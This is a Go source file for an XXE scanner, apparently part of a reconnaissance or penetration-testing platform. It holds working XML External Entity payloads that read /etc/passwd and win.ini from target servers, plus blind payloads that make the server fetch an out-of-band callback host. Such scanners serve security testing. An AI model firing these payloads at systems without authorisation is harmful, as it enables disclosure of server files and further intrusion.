package scanner

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/recon-platform/internal/config"
	"github.com/recon-platform/internal/database"
	"github.com/recon-platform/internal/tools"
	"github.com/recon-platform/pkg/logger"
)

// XXEScanner probes XML-processing endpoints for XML External Entity injection,
// the way it actually manifests in the wild:
//
//   - IN-BAND file read: an external entity resolves file:///etc/passwd (and
//     win.ini) and the parser echoes it into the response. Confirmed by the
//     unmistakable `root:x:0:0:` / `[extensions]` signatures — zero false
//     positives.
//   - OUT-OF-BAND (blind) XXE: when the response reveals nothing, an external
//     entity forces the server to fetch http://<callback>/oob/<token>. The hit
//     lands on the shared OAST endpoint and is raised as a confirmed blind_xxe
//     finding — this catches XXE on parsers that suppress entity output.
//
// It targets endpoints that plausibly consume XML (POST services, XML/JSON
// content-types, SOAP-ish paths) and always sends a correct Content-Type so the
// server routes the body to its XML parser.
type XXEScanner struct {
	db        *database.DB
	exec      *tools.Executor
	cfg       *config.Config
	logger    *logger.Logger
	broadcast BroadcastFunc
}

func NewXXEScanner(db *database.DB, exec *tools.Executor, cfg *config.Config, log *logger.Logger, broadcast BroadcastFunc) *XXEScanner {
	return &XXEScanner{db: db, exec: exec, cfg: cfg, logger: log, broadcast: broadcast}
}

var xxeClient = newPooledClient(15*time.Second, false)

// In-band signatures that only appear when a file was actually read.
var xxeFileSignatures = []string{"root:x:0:0:", "root:!:0:0:", "[extensions]", "; for 16-bit app support"}

func (s *XXEScanner) Run(ctx context.Context, targetID string, logFn LogFunc) error {
	endpoints := s.candidateEndpoints(ctx, targetID)
	if len(endpoints) == 0 {
		logFn("info", "xxe", "No XML-capable endpoints to test for XXE")
		return nil
	}
	logFn("info", "xxe", fmt.Sprintf("Testing %d endpoint(s) for XXE (in-band file read + OAST blind)...", len(endpoints)))

	auth := loadAuthHeaders(ctx, s.db, targetID)
	oobBase := strings.TrimRight(s.cfg.BlindXSSCallbackURL, "/")

	sem := make(chan struct{}, 10)
	var wg sync.WaitGroup
	var found atomic.Int64

	for _, ep := range endpoints {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(u string) {
			defer wg.Done()
			defer func() { <-sem }()

			// 1. In-band file read — try /etc/passwd then win.ini.
			for _, target := range []string{"file:///etc/passwd", "file:///c:/windows/win.ini"} {
				body := s.sendXML(ctx, u, inbandXXEPayload(target), auth)
				if sig := matchAny(body, xxeFileSignatures); sig != "" {
					ev := fmt.Sprintf("In-band XXE: external entity read %s — response contained %q", target, sig)
					s.store(targetID, "xxe", "critical", u, "", inbandXXEPayload(target), ev, 100, 500)
					found.Add(1)
					logFn("warn", "xxe", "XXE (in-band file read): "+u)
					if s.broadcast != nil {
						s.broadcast("new_vuln_finding", map[string]any{
							"target_id": targetID, "type": "xxe", "url": u, "parameter": "",
						})
					}
					return // confirmed; no need to keep probing this endpoint
				}
			}

			// 2. Out-of-band blind XXE — only if a callback URL is configured.
			if oobBase != "" {
				token := newXSSToken("rcnoob")
				_, _ = s.db.Exec(`
					INSERT INTO oob_probes (token, target_id, url, parameter, kind, sink)
					VALUES (?, ?, ?, '', 'xxe', 'xml-body') ON CONFLICT(token) DO NOTHING`,
					token, targetID, u)
				cb := "http://" + stripScheme(oobBase) + "/oob/" + token
				s.sendXML(ctx, u, oobXXEPayload(cb), auth)
				// Confirmation (if any) arrives asynchronously via /oob/<token>.
			}
		}(ep)
	}
	wg.Wait()
	logFn("info", "xxe", fmt.Sprintf("XXE done. %d in-band finding(s); blind hits report via callback.", found.Load()))
	return nil
}

// candidateEndpoints returns URLs worth sending XML to: alive services (POST is
// tried regardless, since GET endpoints often still parse a posted body) with a
// bias toward XML/SOAP content-types and paths.
func (s *XXEScanner) candidateEndpoints(ctx context.Context, targetID string) []string {
	seen := map[string]bool{}
	var out []string
	add := func(u string) {
		if u != "" && !seen[u] && len(out) < 300 {
			seen[u] = true
			out = append(out, u)
		}
	}

	// Prefer endpoints that already look XML-ish.
	rows, err := s.db.QueryContext(ctx, `
		SELECT url FROM http_services
		WHERE target_id = ? AND status_code BETWEEN 200 AND 405
		ORDER BY
			CASE WHEN content_type LIKE '%xml%' OR url LIKE '%xml%' OR url LIKE '%soap%'
			     OR url LIKE '%/api%' OR url LIKE '%rpc%' THEN 0 ELSE 1 END,
			url
		LIMIT ?`, targetID, s.cfg.URLLimit())
	if err == nil {
		for rows.Next() {
			var u string
			if rows.Scan(&u) == nil {
				add(u)
			}
		}
		rows.Close()
	}

	// Also any parameter endpoint declaring an XML content-type.
	prows, err := s.db.QueryContext(ctx, `
		SELECT DISTINCT url FROM parameters
		WHERE target_id = ? AND content_type LIKE '%xml%' LIMIT 100`, targetID)
	if err == nil {
		for prows.Next() {
			var u string
			if prows.Scan(&u) == nil {
				add(stripQuery(u))
			}
		}
		prows.Close()
	}
	return out
}

func (s *XXEScanner) sendXML(ctx context.Context, u, body string, auth map[string]string) string {
	reqCtx, cancel := context.WithTimeout(ctx, 12*time.Second)
	defer cancel()
	req, err := http.NewRequestWithContext(reqCtx, "POST", stripQuery(u), strings.NewReader(body))
	if err != nil {
		return ""
	}
	req.Header.Set("Content-Type", "application/xml")
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; ReconBot/1.0)")
	for k, v := range auth {
		req.Header.Set(k, v)
	}
	resp, err := xxeClient.Do(req)
	if err != nil {
		return ""
	}
	out, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	resp.Body.Close()
	return string(out)
}

func (s *XXEScanner) store(targetID, typ, sev, url, param, payload, evidence string, confidence, priority int) {
	verdict := CandDetected
	if confidence >= ConfEvidence {
		verdict = VerifyVerified
	}
	_, _ = RecordDetectorObservation(context.Background(), s.db, DetectorObservation{
		TargetID: targetID, Type: typ, Severity: sev, URL: url, Method: "POST",
		Parameter: param, Location: "xml", Payload: truncate(payload, 400), Evidence: evidence,
		Source: "xxe-native", DetectionMethod: "entity-signature", Confidence: confidence,
		Priority: priority, Verdict: verdict,
	})
}

func inbandXXEPayload(fileURI string) string {
	return `<?xml version="1.0"?>` +
		`<!DOCTYPE root [<!ENTITY xxe SYSTEM "` + fileURI + `">]>` +
		`<root>&xxe;</root>`
}

func oobXXEPayload(cb string) string {
	// External general entity that forces an outbound fetch to our callback.
	return `<?xml version="1.0"?>` +
		`<!DOCTYPE root [<!ENTITY xxe SYSTEM "` + cb + `">]>` +
		`<root>&xxe;</root>`
}

func matchAny(body string, sigs []string) string {
	for _, s := range sigs {
		if strings.Contains(body, s) {
			return s
		}
	}
	return ""
}
